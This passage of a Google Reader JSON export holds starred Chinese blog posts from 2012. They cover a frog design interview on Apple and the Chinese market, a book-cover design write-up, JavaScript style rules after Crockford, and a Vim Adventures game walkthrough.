是从《乔布斯传》中。上世纪80年代和乔布斯的两次合作的设计，分别获得《Times》和《BusinessWeek》评选的年度最近设计奖。和苹果和乔布斯合作的经历给青蛙设计 带来了什么？</p>\n<p><strong>Mr. Rolston： </strong>1982年，艾斯林格（青蛙设计的创始人）开始为苹果工作。这段合作经历让我们有机会参与设计了里程碑式的产品。但令人印象最深刻是，这种合作关系的性质。不像两个公司之间的商业关系，而更像真正的搭档和朋友那样合作。</p>\n<p>乔布斯能够敏锐地发现你的价值，尊重你的价值，和你成为伙伴，而不是指挥你做这做那。人们都知道设计师可以提供重要的价值，但是往往只有那些拥有开放价值观的客户才能从中受益。如果客户们不去聆听，设计师就无法和他们沟通，所能提供的价值也是有限的。</p>\n<p>我们一直都在帮助我们的客户创造有影响力的产品，服务和体验，给他们带来比预期更多的东西，有更多有兴趣去挑战。苹果公司是从这类合作关系中收益的一个案例，</p>\n<p style=\"color:#090\"><strong>西乔： </strong>青蛙设计 在官方网站上提到有一个专长是“<a href=\"http://www.frogdesign.cn/expertise/china.html\">中国</a>”，这说明你们对在中国市场的业务非常有信心，对吗？</p>\n<p><strong>Mr. Rolston：</strong>哈，我们对任何地区的市场都很有信心。中国是一个每天都在增长，快速改变的市场。但我们在这里了花费大量时间，围绕中国用户的行为和消费者的生活来做研究。我们关心他们的想法，他们如何生活，他们的需求是什么，他们希望世界变成什么样？在零售，医疗，消费电子，移动通讯，媒体，时尚等诸多领域，我们积累了大量对用户的了解，基于这些数据，我们开始感到有信心。这是一个很大的市场，拥有大量的用户和快速变化的节奏。对于该如何开展在中国的业务，引导中国的用户，我们还处于一个学习的过程中。</p>\n<p style=\"color:#090\"><strong>西乔：</strong>有人总结在中国，设计的最大的特点是山寨和没品。您知道山寨这个词吗？从历史上看，中国制造的品牌并不重视设计的价值，因为他们的优势就是低研发周期，低成本，低价格竞争，而且并不在乎拿用户冒险，在这一点上，青蛙设计对待设计的观点，或者说青蛙设计提供的服务，和这些“中国制造”的成功之道并不相符，甚至与它们的节奏和优势是冲突的。在这种情况下，你们仍对中国市场充满信心吗？</p>\n<p><strong>Mr. Rolston：</strong>我知道山寨。但我们相信，在任何时候，任何市场中，人们都想要高质量、有意义的产品。用户和市场期待突破性的改变。当桌上有20个看起来差不多的手机时，用户的选择会很困难。但如果有其中一款手机做了更好的设计，提高品质，使用了更好的材料，配备更好的软件，用户的决定将是显而易见的。每一个市场都证明了这一点，如果人们有足够的资源，他们自然会选择更好的，去证明存在感，赋予生活更高的价值。在中国，经济发展使人们拥有了更好的消费能力，去选择拥有出色的设计的产品。人们会为了追求更高的品质而掏钱。这是伴随经济增长会自然而然发生的现象。</p>\n<p>我们也接触过制作山寨产品的客户，他们不再只想做山寨产品，而是想要好的原创的设计。他们意识到这会给他们带来更大的市场。</p>\n<p>另外中国通常认为他们所面临的版权现状是很特殊的，但所有年轻的市场在开始时都伴随过这种问题。在19世纪，美国也盗版英国的图书而不支付任何版权费用。在不同的历史时期可能表现有所不同，但市场和用户成长的趋势是相同的。品质、创新、标准和清晰是人类共同的追求。</p>\n<p>同时，山寨工厂也不仅仅只做了抄袭，他们也从这一过程中获得了技术和经验。最后技术也会被用于去创造新的东西。市场会激发企业，激发用户。人类与生俱来就拥有创造的激情，这种激情必定也会在中国成长起来，不，它已经在成长了。</p>\n<p style=\"color:#090\"><strong><a href=\"http://www.frogdesign.cn/services/capabilities/design-research.html\"><img src=\"http://blog.xiqiao.info/blogimg/frog/design_search.jpg\" alt=\"\" width=\"250\" height=\"630\" align=\"right\"></a>西乔：<br>\n</strong>中国市场还有一个特点是，用户群的消费能力、消费习惯和使用习惯差异很大，不同的地区之间文化差异也很大。你们的网站上提到，你们能够分析中国一线城市和较远的农村市场中消费者的行为，来作为创新机会的灵感。在对待中国在用户群和地区的巨大差异问题上，许多本土企业都无法取得成功，而你们在这方面有什么心得?</p>\n<p><strong>Mr. Rolston：</strong>的确存在巨大的差异，而且这些差异会限制你产品的适应性，但我们试着不去考虑这些，而是把注意力放到用户真正的需要上。他们只是不同的用户，不管生活在大城市还是农村，人们都期待高质量的生活。差别只在于是否有足够的经济能力去得到它而已。</p>\n<p style=\"color:#090\"><strong>西乔： </strong>设计研究和用户研究是青蛙设计的另一个专长，那对设计的研究主要是用于解决客户在发展中遇到的现有问题，还是用于激发灵感、形成创新的产品策略？</p>\n<p><strong>Mr. Rolston：</strong>我们所做的一切都是为了创新。设计研究不会确切得告诉你应该去做什么，而是帮助你建立理解和关注重点。你在为谁设计，怎样做最合理最好，最终设计师会从这些灵感中得到信息，获得原创的解决方案。设计研究无法直接回答问题，而是提供一种帮助你解决问题的工具。</p>\n<p style=\"color:#090\"><strong>西乔：</strong> 在用户研究中，有两个很难回避的问题，一是用户其实并不知道它们真正想要的是什么, 二统计和数字解决往往并不能真正解读用户的期望。还有人说苹果从来不做用户调研，因为他们做的是超越时代的产品。你同意这种说法吗？</p>\n<p><strong>Mr.Rolston：</strong>不。我不这么认为。用户不会直接告诉你他们要的是什么，但如果你多花点时间，就可以了解到他们真正的需求。苹果会做用户研究，但不是以传统的形式。苹果只设计自己会去使用的产品，在设计和开发过程中，设计师，工程师和员工会去反复使用他们所创造的产品，在使用过程中反复测试、分析、研究和提升产品。他们自己就是用户，这种关系会驱动他们不断完善设计。而很多其它公司并不是这样，他们会设计一些自己从来不用的产品，也从来没想过要成为这些产品的用户。</p>\n<p>对于我而言，我并不一个中国人，但如果我需要为中国用户设计产品，我会亲身到中国来体验人们的生活，来了解他们真正的需要。</p>\n<p>很多中国公司追求快速的研发周期，不愿意做深入用户研究。但了解你的用户是非常有价值的事情，你可以变得离他们越来越近。</p>\n<p style=\"color:#090\"><strong>西乔：</strong> 在设计研究中，你们主要采取的是定性研究对吗，这会带来一个问题，研究的成功与否非常需要依赖研究者的水平。这就导致这种研究模式难以复制，服务的规模难以扩大，青蛙设计 是怎样解决这个困境的，保持研究质量的稳定？</p>\n<p><strong>Mr. Rolston：</strong>我们通过创建和培养企业文化来解决这个问题。青蛙设计有很好的传统与方法来传授它的设计研究思想和创新文化，让员工具备高水准的技巧和能力。同时我们在做设计研究的时候，不仅只有分析师和研究者，设计师会参与整个过程，在他们在观察用户的时候，同时也在考虑方案。青蛙设计在设计方法的一个重要特点正是将设计和研究结合起来。</p>\n<p style=\"color:#090\"><strong>西乔： </strong>产品主要关注的是给用户带去的价值；商业主要关注如何盈利；而创新则更关注如何超越期待，获得更高更长久的利益，这三者的有一致也有冲突，你们是如何帮助客户平衡这它们的？</p>\n<p><strong>Mr. Rolston：</strong>我们的很多客户也会问过这个问题，但是在成功的产品和设计中，这三者不是冲突的。开发一个好的产品，可以让你获得更大的市场，赢得更高的利润。同时一个好的产品也一定离不开创新。创新实际上提供了一种更新更容易的方式让你赢得市场。iPhone的成功就是最有说服里的案例。所以解决冲突的方法就是创造最好的产品，最好的设计。</p>\n<p>但对于青蛙设计而言，所面对的最大挑战便是去说服我们的客户。他们觉得已经花了很多钱在设计上。但这不仅仅是投入多少钱的问题，而是要投入精力，去重视产品和设计的价值。</p>\n<p style=\"color:#090\"><strong>西乔： </strong>中国的客户更难被说服吗？</p>\n<p><strong>Mr. Rolston：</strong>是的。但这只是时间问题。市场在不断成长，企业会感到更多的竞争压力。比如华为，当我们第一次与他们合作的时候，他们并没有感到太多竞争，他们有自己的特长。但如今，他们开始希望通过更好的产品设计来取得更大的优势。有许多成功的公司，都利用设计策略让自己更具个性，在竞争中脱颖而出。不仅仅是传统意义上的产品设计，还包括利用创新的方法和程序去改造生产流程。重视产品品质和创新，对于用户和企业是双赢的，既改善了普通人的生活和产品体验，也为世界带来更多价值。</p>\n<p style=\"color:#090\"><strong>西乔：</strong> 距离07年青蛙设计宣布成立<a href=\"http://www.frogdesign.cn/contact/shanghai.html\">上海工作室</a>，已经过去了5年。在这5年内，青蛙设计Asia发生了<strong> </strong>哪些重要的变化？</p>\n<p><strong>Mr. Rolston：</strong>我们成长了，从1名员工到56个人的团队。我们也从中国的市场学习到了很多。市场同时也成熟了很多。我们认为在中国市场花费的时间是非常值得的。我们希望变得规模更大，更敏捷，为中国用户创造出色的产品，和那些有同样追求的中国公司一起，推动他们获得惊人赞叹的创新和产品。让这些公司成为强大受尊敬的企业。不仅仅只追求更高的利润，而是像苹果公司那样，去创造出让用户们深爱的产品。</p>\n<p>——————————–</p>\n<p>本文原载于<a href=\"http://www.programmer.com.cn/11512/\">《程序员》杂志2012年第5期</a>。</p>\n<p>除The sixth sense外，所有图片版权属于<a href=\"http://frogdesign.com\">Frog</a>。</p>\n<p>感谢Frog的Shine、 提供采访指导的<a href=\"http://www.china30s.com/?author=1\">功夫茶</a>、提供翻译和技术指导的<a href=\"http://7thgen.info/\">Neo Lee</a>、提供技术指导和感情支持的<a href=\"http://blog.devep.net/virushuo/\">Virushuo</a></p>"
    },
    "author" : "西乔",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://feeds.feedburner.com/hc1983",
      "title" : "西乔的九卦",
      "htmlUrl" : "http://blog.xiqiao.info"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1336640369215",
    "timestampUsec" : "1336640369215700",
    "id" : "tag:google.com,2005:reader/item/f4b10770bffc1846",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "作品", "设计" ],
    "title" : "《正则指引》封面设计",
    "published" : 1336631815,
    "updated" : 1336631815,
    "alternate" : [ {
      "href" : "http://blog.xiqiao.info/2012/05/10/1167",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p><img title=\"《正则指引》封面设计\" src=\"http://blog.xiqiao.info/blogimg/cover_design/cover_design.jpg\" alt=\" 《正则指引》封面设计\"><br>\n“著作等膝”的<a title=\"http://www.luanxiang.org/\" href=\"http://www.luanxiang.org/\">余晟</a>老师的新书已经上市。去年11月我为他的新书<a href=\"http://www.luanxiang.org/blog/archives/tag/%E6%AD%A3%E5%88%99%E6%8C%87%E5%BC%95\">《正则指引》</a>所设计的封面。  这是一本关于如何使用正则表达式的专业教程，以余老师文风严谨，玉树临风的品质，大家一定不可以错过。</p>\n<p><img title=\"《正则指引》封面设计\" src=\"http://blog.xiqiao.info/blogimg/cover_design/regular_expression_cover_design.gif\" alt=\" 《正则指引》封面设计\"></p>\n<p>细节图</p>\n<p><img title=\"《正则指引》封面设计\" src=\"http://blog.xiqiao.info/blogimg/cover_design/cover_design_detail.jpg\" alt=\" 《正则指引》封面设计\"></p>\n<p>根据的书名 “指引”, 我们决定手绘一幅复古风格的地图来作为封面的主题, 将其中所有的地名都替换使用表达式或技术名词。  这是我第一次手绘地图, 使用的工具是wacom intro 4, PS 和AI。 在确定构图以后, 先绘制了山脉, 因为山脉会决定河流的流向, 以及整体的结构。然后是水文。</p>\n<p>我认为森林会起到暗部的作用, 形成对比。书名应该是视觉焦点所在, 所以我将森林的分布设计成拥有导向线功能的几个条形区域, 将用户的视线集中到左下位置。  森林的绘制使用了AI里的符号功能, 而建筑使用了矢量构建的智能对象, 以便随时进行非线性的调整。</p>\n<p>山脉, 河流和建筑的地名分别使用了编程语言, 方法和一些经典的表达式。</p>\n<p>在挑选表达式的字体时, 我选用了一款拥有衬线的等宽字体, 即符合手绘地图的风格, 又能引起用户群的共鸣 （看见等宽你们变身了没）。</p>\n<p>整体耗时9个小时。最费功夫的部分是处理水文和森林。</p>\n<p><img title=\"《正则指引》封面设计\" src=\"http://blog.xiqiao.info/blogimg/cover_design/cover_design_step.gif\" alt=\" 《正则指引》封面设计\"></p>"
    },
    "author" : "西乔",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://feeds.feedburner.com/hc1983",
      "title" : "西乔的九卦",
      "htmlUrl" : "http://blog.xiqiao.info"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1335523354706",
    "timestampUsec" : "1335523354706437",
    "id" : "tag:google.com,2005:reader/item/1118b4b3800f2a47",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "IT" ],
    "title" : "Javascript编程风格",
    "published" : 1335522618,
    "updated" : 1335522618,
    "alternate" : [ {
      "href" : "http://www.ruanyifeng.com/blog/2012/04/javascript_programming_style.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "<p><a href=\"http://www.crockford.com/\">Douglas Crockford</a>是Javascript权威，<a href=\"http://www.ruanyifeng.com/blog/2009/05/data_types_and_json.html\">Json格式</a>就是他的发明。</p><p>去年11月他有一个演讲（<a href=\"http://www.youtube.com/watch?v=taaEzHI9xyY\">Youtube</a>），谈到了好的Javascript编程风格是什么。</p>\n\n<p><a href=\"http://www.youtube.com/watch?v=taaEzHI9xyY\"><img src=\"http://image.beekka.com/blog/201204/bg2012042701.jpg\"></a></p>\n\n<p>我非常推荐这个演讲，它不仅有助于学习Javascript，而且能让你心情舒畅，因为Crockford讲得很幽默，时不时让听众会心一笑。</p>\n\n<p>下面，我根据这个演讲和Crockford编写的<a href=\"http://javascript.crockford.com/code.html\">代码规范</a>，总结一下\"Javascript编程风格\"。</p>\n\n<p><img src=\"http://image.beekka.com/blog/201204/bg2012042702.jpg\"></p>\n\n<p><strong>所谓\"编程风格\"（programming style），指的是编写代码的样式规则。</strong>不同的程序员，往往有不同的编程风格。</p>\n\n<p>有人说，编译器的规范叫做\"语法规则\"（grammar），这是程序员必须遵守的；而编译器忽略的部分，就叫\"编程风格\"（programming style），这是程序员可以自由选择的。这种说法不完全正确，<strong>程序员固然可以自由选择编程风格，但是好的编程风格有助于写出质量更高、错误更少、更易于维护的程序。</strong></p>\n\n<p>所以，有一点应该明确，<strong>\"编程风格\"的选择不应该基于个人爱好、熟悉程度、打字工作量等因素，而要考虑如何尽量使代码清晰易读、减少出错。你选择的，不是你喜欢的风格，而是一种能够清晰表达你的意图的风格。</strong>这一点，对于Javascript这种语法自由度很高、设计<a href=\"http://www.ruanyifeng.com/blog/2010/01/12_javascript_syntax_structures_you_should_not_use.html\">不完全成熟</a>的语言尤其重要。</p>\n\n<p><img src=\"http://image.beekka.com/blog/201204/bg2012042704.jpg\"></p>\n\n<p><strong>一、大括号的位置</strong></p>\n\n<p>绝大多数的编程语言，都用大括号（{}）表示区块（block）。起首的大括号的位置，有许多不同的<a href=\"http://en.wikipedia.org/wiki/Indent_style\">写法</a>。</p>\n\n<p>最流行的有两种。一种是起首的大括号另起一行：</p>\n\n<blockquote>\n\n<p>　　block</p>\n\n<p>　　{</p>\n\n<p>　　　　...</p>\n\n<p>　　}</p>\n\n</blockquote>\n\n<p>另一种是起首的大括号跟在关键字的后面：</p>\n\n<blockquote>\n\n<p>　　block {</p>\n\n<p>　　　　...</p>\n\n<p>　　}</p>\n\n</blockquote>\n\n<p>一般来说，这两种写法都可以接受。但是，Javascript要使用后一种，因为Javascript会自动添加句末的分号，导致一些难以察觉的错误。</p>\n\n<blockquote>\n\n<p>　　return </p>\n\n<p>　　{</p>\n\n<p>　　　　key:value;</p>\n\n<p>　　};</p>\n\n</blockquote>\n\n<p>上面的代码的原意，是要返回一个对象，但实际上返回的是undefined，因为Javascript自动在return语句后面添加了分号。为了避免这一类错误，需要写成下面这样：</p>\n\n<blockquote>\n\n<p>　　return {</p>\n\n<p>　　　　key : value;</p>\n\n<p>　　};</p>\n\n</blockquote>\n\n<p>因此，</p>\n\n<blockquote>\n\n<p>　　<strong>规则1：表示区块起首的大括号，不要另起一行。</strong></p>\n\n</blockquote>\n\n<p><strong>二、 圆括号</strong></p>\n\n<p>圆括号（parentheses）在Javascript中有两种作用，一种表示调用函数，另一种表示不同的值的组合（grouping）。我们可以用空格，区分这两种不同的括号。</p>\n\n<blockquote>\n\n<p>　　<strong>规则2：调用函数的时候，函数名与左括号之间没有空格。</strong></p>\n\n</blockquote>\n\n<blockquote>\n\n<p>　　<strong>规则3：函数名与参数序列之间，没有空格。</strong></p>\n\n</blockquote>\n\n<blockquote>\n\n<p>　　<strong>规则4：所有其他语法元素与左括号之间，都有一个空格。</strong></p>\n\n</blockquote>\n\n<p>按照上面的规则，下面的写法都是不规范的：</p>\n\n<blockquote>\n\n<p>　　foo (bar)</p>\n\n<p>　　return(a+b);</p>\n\n<p>　　if(a === 0) {...}</p>\n\n<p>　　function foo (b) {...}</p>\n\n<p>　　function(x) {...}</p>\n\n</blockquote>\n\n<p><img src=\"http://image.beekka.com/blog/201204/bg2012042705.jpg\"></p>\n\n<p><strong>三、分号</strong></p>\n\n<p>分号表示语句的结束。大多数情况下，如果你省略了句尾的分号，Javascript会自动添加。</p>\n\n<blockquote>\n\n<p>　　var a = 1</p>\n\n</blockquote>\n\n<p>等同于</p>\n\n<blockquote>\n\n<p>　　var a = 1;</p>\n\n</blockquote>\n\n<p>因此，有人<a href=\"http://mislav.uniqpath.com/2010/05/semicolons/\">提倡</a>省略句尾的分号。但麻烦的是，如果下一行的第一个字元（token）是下面这五个字符之一，Javascript将不对上一行句尾<a href=\"http://inimino.org/~inimino/blog/javascript_semicolons\">添加分号</a>：\"(\"、\"[\"、\"/\"、\"+\"和\"-\"。</p>\n\n<blockquote>\n\n<p>　　x = y</p>\n\n<p>　　(function (){</p>\n\n<p>　　　　...</p>\n\n<p>　　})();</p>\n\n</blockquote>\n\n<p>上面的代码等同于</p>\n\n<blockquote>\n\n<p>　　x = y(function (){...})();</p>\n\n</blockquote>\n\n<p>因此，</p>\n\n<blockquote>\n\n<p>　　<strong>规则5：不要省略句末的分号。</strong></p>\n\n</blockquote>\n\n<p><strong>四、with语句</strong></p>\n\n<p>with可以减少代码的书写，但是会造成混淆。</p>\n\n<blockquote>\n\n<p>　　with (o) {</p>\n\n<p>　　　　foo = bar;</p>\n\n<p>　　}</p>\n\n</blockquote>\n\n<p>上面的代码，可以有四种运行结果：</p>\n\n<blockquote>\n\n<p>　　o.foo = bar;</p>\n\n<p>　　o.foo = o.bar;</p>\n\n<p>　　foo = bar;</p>\n\n<p>　　foo = o.bar;</p>\n\n</blockquote>\n\n<p>这四种结果都可能发生，取决于不同的变量是否有定义。因此，</p>\n\n<blockquote>\n\n<p>　　<strong>规则6：不要使用with语句。</strong></p>\n\n</blockquote>\n\n<p><img src=\"http://image.beekka.com/blog/201204/bg2012042706.jpg\"></p>\n\n<p><strong>五、相等和严格相等</strong></p>\n\n<p>Javascript有两个表示\"相等\"的运算符：\"相等\"（==）和\"严格相等\"（===）。</p>\n\n<p>因为\"相等\"运算符会自动转换变量类型，造成很多意想不到的<a href=\"http://www.2ality.com/2011/06/javascript-equality.html\">情况</a>：</p>\n\n<blockquote>\n\n<p>　　0 == ''// true</p>\n\n<p>　　1 == true // true</p>\n\n<p>　　2 == true // false</p>\n\n<p>　　0 == '0' // true</p>\n\n<p>　　false == 'false' // false</p>\n\n<p>　　false == '0' // true</p>\n\n<p>　　\" \\t\\r\\n \" == 0 // true</p>\n\n</blockquote>\n\n<p>因此，</p>\n\n<blockquote>\n\n<p>　　<strong>规则7：不要使用\"相等\"（==）运算符，只使用\"严格相等\"（===）运算符。</strong></p>\n\n</blockquote>\n\n<p><strong>六、语句的合并</strong></p>\n\n<p>有些程序员追求简洁，喜欢合并不同目的的语句。比如，原来的语句是</p>\n\n<blockquote>\n\n<p>　　a = b;</p>\n\n<p>　　if (a) {...}</p>\n\n</blockquote>\n\n<p>他喜欢写成下面这样:</p>\n\n<blockquote>\n\n<p>　　if (a = b) {...}</p>\n\n</blockquote>\n\n<p>虽然语句少了一行，但是可读性大打折扣，而且会造成误读，让别人误以为这行代码的意思是：</p>\n\n<blockquote>\n\n<p>　　if （a === b）{...}</p>\n\n</blockquote>\n\n<p>另外一种情况是，有些程序员喜欢在同一行中赋值多个变量：</p>\n\n<blockquote>\n\n<p>　　var a = b = 0;</p>\n\n</blockquote>\n\n<p>他以为，这行代码等同于</p>\n\n<blockquote>\n\n<p>　　var a = 0, b = 0;</p>\n\n</blockquote>\n\n<p>实际上不是，它的真正效果是下面这样：</p>\n\n<blockquote>\n\n<p>　　b = 0;<br>\n <br>\n　　var a = b;</p>\n\n</blockquote>\n\n<p>因此，</p>\n\n<blockquote>\n\n<p>　　<strong>规则8：不要将不同目的的语句，合并成一行。</strong></p>\n\n</blockquote>\n\n<p><img src=\"http://image.beekka.com/blog/201204/bg2012042707.jpg\"></p>\n\n<p><strong>七、变量声明</strong></p>\n\n<p>Javascript会自动将变量声明\"提升\"（hoist）到代码块（block）的头部。</p>\n\n<blockquote>\n\n<p>　　if (!o) {</p>\n\n<p>　　　　var o = {};</p>\n\n<p>　　}</p>\n\n</blockquote>\n\n<p>等同于</p>\n\n<blockquote>\n\n<p>　　var o;</p>\n\n<p>　　if (!o) {</p>\n\n<p>　　　　o = {};</p>\n\n<p>　　}</p>\n\n</blockquote>\n\n<p>为了避免可能出现的问题，不如把变量声明都放在代码块的头部。</p>\n\n<blockquote>\n\n<p>　　for (var i ...) {...}</p>\n\n</blockquote>\n\n<p>最好写成：</p>\n\n<blockquote>\n\n<p>　　var i;<br>\n <br>\n　　for (i ...) {...,}</p>\n\n</blockquote>\n\n<p>因此，</p>\n\n<blockquote>\n\n<p>　　<strong>规则9：所有变量声明都放在函数的头部。</strong></p>\n\n</blockquote>\n\n<blockquote>\n\n<p>　　<strong>规则10：所有函数都在使用之前定义。</strong></p>\n\n</blockquote>\n\n<p><strong>八、全局变量</strong></p>\n\n<p>Javascript最大的语法缺点，可能就是全局变量对于任何一个代码块，都是可读可写。这对代码的模块化和重复使用，非常不利。</p>\n\n<blockquote>\n\n<p>　　<strong>规则11：避免使用全局变量；如果不得不使用，用大写字母表示变量名，比如UPPER_CASE。</strong></p>\n\n</blockquote>\n\n<p><img src=\"http://image.beekka.com/blog/201204/bg2012042708.jpg\"></p>\n\n<p><strong>九、new命令</strong></p>\n\n<p>Javascript使用new命令，从建构函数生成一个新对象。</p>\n\n<blockquote>\n\n<p>　　var o = new myObject();</p>\n\n</blockquote>\n\n<p>这种做法的问题是，一旦你忘了加上new，myObject()内部的this关键字就会指向全局对象，导致所有绑定在this上面的变量，都变成全部变量。</p>\n\n<blockquote>\n\n<p>　　<strong>规则12：不要使用new命令，改用<a href=\"https://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/Object/create\">Object.create()</a>命令。</strong></p>\n\n</blockquote>\n\n<p>如果不得不使用new，为了防止出错，最好在视觉上把建构函数与其他函数区分开来。</p>\n\n<blockquote>\n\n<p>　　<strong>规则13：建构函数的函数名，采用首字母大写（InitialCap）；其他函数名，一律首字母小写。</strong></p>\n\n</blockquote>\n\n<p><strong>十、自增和自减运算符</strong></p>\n\n<p>自增（++）和自减（--）运算符，放在变量的前面或后面，返回的值不一样，很容易发生错误。</p>\n\n<p>事实上，所有的++运算符都可以用\"+= 1\"代替。</p>\n\n<blockquote>\n\n<p>　　++x</p>\n\n</blockquote>\n\n<p>等同于</p>\n\n<blockquote>\n\n<p>　　x += 1;</p>\n\n</blockquote>\n\n<p>代码变得更清晰了。有一个很可笑的例子，某个Javascript函数库的源代码中出现了下面的片段：</p>\n\n<blockquote>\n\n<p>　　++x;</p>\n\n<p>　　++x;</p>\n\n</blockquote>\n\n<p>这个程序员忘了，还有更简单、更合理的写法：</p>\n\n<blockquote>\n\n<p>　　x += 2;</p>\n\n</blockquote>\n\n<p>因此，</p>\n\n<blockquote>\n\n<p>　　<strong>规则14：不要使用自增（++）和自减（--）运算符，用+=和-=代替。</strong></p>\n\n</blockquote>\n\n<p><strong>十一、区块</strong></p>\n\n<p>如果循环和判断的代码体只有一行，Javascript允许该区块（block）省略大括号。</p>\n\n<p>下面的代码</p>\n\n<blockquote>\n\n<p>　　if (a) b(); c();</p>\n\n</blockquote>\n\n<p>原意可能是</p>\n\n<blockquote>\n\n<p>　　if (a) { b(); c();}</p>\n\n</blockquote>\n\n<p>但是，实际效果是</p>\n\n<blockquote>\n\n<p>　　if (a) { b();} c();</p>\n\n</blockquote>\n\n<p>因此，</p>\n\n<blockquote>\n\n<p>　　<strong>规则15：总是使用大括号表示区块。</strong></p>\n\n</blockquote>\n\n<p>（完）</p><div style=\"color:#556677;line-height:160%;padding:0.3em 0.5em;border:1px solid #d3d3d3;margin:1em;background-color:#aad2f0;border-radius:10px\"><h3>文档信息</h3>\n<ul>\n<li>版权声明：自由转载-非商用-非衍生-保持署名 | <a href=\"http://creativecommons.org/licenses/by-nc-nd/3.0/deed.zh\">Creative Commons BY-NC-ND 3.0</a></li>\n<li>原文网址：<a href=\"http://www.ruanyifeng.com/blog/2012/04/javascript_programming_style.html\">http://www.ruanyifeng.com/blog/2012/04/javascript_programming_style.html</a></li>\n<li>最后修改时间：2012年7月 4日 11:46</li>\n<li>付费支持：<a href=\"https://me.alipay.com/ruanyf\"><img src=\"http://www.ruanyifeng.com/blog/images/rmb_32.png\" title=\"人民币\" alt=\"人民币 - 支付宝\" style=\"border:none;vertical-align:middle\"></a> | <a href=\"https://www.paypal.com/cgi-bin/webscr?cmd=_xclick&amp;business=yifeng.ruan@gmail.com&amp;currency_code=USD&amp;amount=0.99&amp;return=http://www.ruanyifeng.com/thank.html&amp;item_name=Ruan%20YiFeng&#39;s%20Blog&amp;undefined_quantity=1&amp;no_note=0\"><img src=\"http://www.ruanyifeng.com/blog/images/dollar_32.png\" alt=\"美元 - paypal\" title=\"美元\" style=\"border:none;vertical-align:middle\"></a> </li>\n</ul></div><div style=\"color:#556677;line-height:160%;padding:0.3em 0.5em;margin:1em;border-radius:10px\"><p><a href=\"http://yipinzao.com/\" style=\"border:none\"><img src=\"http://www.ruanyifeng.com/blog/images/ad_yipinzao.jpg\" style=\"border:none\"></a>\n</p></div>"
    },
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://feeds.feedburner.com/ruanyifeng",
      "title" : "阮一峰的网络日志",
      "htmlUrl" : "http://www.ruanyifeng.com/blog/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1335430634811",
    "timestampUsec" : "1335430634811215",
    "id" : "tag:google.com,2005:reader/item/79eb2e6c0c702b9b",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "杂项资源", "轶事趣闻", "vi", "vim" ],
    "title" : "游戏：VIM大冒险",
    "published" : 1335399742,
    "updated" : 1335399742,
    "alternate" : [ {
      "href" : "http://coolshell.cn/articles/7166.html",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p>不知道大家是否还记得“<a title=\"简明 Vim 练级攻略\" href=\"http://coolshell.cn/articles/5426.html\">Vim简明攻略</a>”呢？你是不是对Vim的那一大堆热键很头痛呢？现在好好，下面这个游戏是一个使用VIM热键玩的游戏。你可以在玩游戏的过程中熟悉Vim的热键。</p>\n<p><strong>你可以点击图片，或是图片下的网址打开这个游戏</strong></p>\n<p style=\"text-align:center\"><strong><a href=\"http://vim-adventures.com/\">http://vim-adventures.com/</a></strong></p>\n<p style=\"text-align:center\"><a href=\"http://vim-adventures.com/\"><img title=\"VIM Adventures\" src=\"http://coolshell.cn/wp-content/uploads/2012/04/vimadventuresgamefun.jpg\" alt=\"VIM大冒险\" width=\"600\" height=\"369\"></a></p>\n<p style=\"text-align:left\">我试玩了一下这个游戏，真的很不错，下面是一些我给的游戏攻略。</p>\n<p style=\"text-align:left\"><span></span></p>\n<ul>\n<li>第一关，场景一，首先是使用vim的h, j, k, l四个键来控制方向。（如果你妄图使用光标键的话，系统会出现黄色警告的）你需要使用h, j, k, l 四个方向走到图的右边，找到一把钥匙。（注意：迷宫墙上有些斜面，你可以通过斜面），找到钥匙后，钥匙会出现在你的右上角的位置，示意着你的光标要向那个方向移动，当你到达一个门的时候，会自动开门，进入第二关。</li>\n</ul>\n<ul>\n<li>第二关，每一关的小人都会给你一些英文提示，教你怎么玩。关于第二关，你会看到你过不去，小会提示你，那些绿草地就向我们文件中的行，你在行上按上下键，光标会在这一列上移动，如果这一下面的一行没有这么长，光标会到行尾。这个vim的特性会告诉我们如何过这一关——移到最上面的行尾（因为是最长的可以越过最下面的障碍），然后按下光标键，到最后一行时你就会发现光标已经过了阻碍。如此通过第二场景，达到一个小人后，按下键，进入第二关。</li>\n</ul>\n<ul>\n<li>第三关，我们可以看到地图上有很多的字母，我们还可以看到有两个键，一个是w，一个是e，我们可以把光标移到w上吃到w后，我们就可以使用w键了——以单词为单位移动光标，这样，我们就可以吃到e了和第一把钥匙，我们按w和e我们就可以看到这两个按键都是以单词为单位移动光标的，一个是单词头，一个是单词尾（参看我以前给大家的<a title=\"给程序员的VIM速查卡\" href=\"http://coolshell.cn/articles/5479.html\">vim按键速查卡</a>）。然后，我们在最后一行通过单词跳跃到最右边吃到b—— 回到该单词的头，可以得到第二把钥匙。然后往上走，使用b 和 e键拿到第三把钥匙。然后就可以打开三个门通关了。</li>\n</ul>\n<div style=\"width:441px\"><a href=\"http://vim-adventures.com/\"><img title=\"Vim Adventures 第三关\" src=\"http://coolshell.cn/wp-content/uploads/2012/04/vimadventuresgamefun02.jpg\" alt=\"Vim Adventures 第三关\" width=\"431\" height=\"286\"></a><p>Vim Adventures 第三关</p></div>\n<p style=\"text-align:left\">然后，就需要你注册才能玩了。作者说，因为需要发的邮件太多了，所以现在系统发不出邮件了，请等待。所以，不知道作者是用来收集邮件的，还是没有开发完，不过，<strong>这个游戏的创意实在是太赞了</strong>。推荐给大家。</p>\n<p style=\"text-align:left\"><strong>哪位会做游戏又熟Vim的朋友也能做一个？</strong></p>\n<p style=\"text-align:left\">（全文完）</p>\n<div style=\"margin-top:15px;font-style:italic\">\n<p><strong>（转载本站文章请注明作者和出处 <a 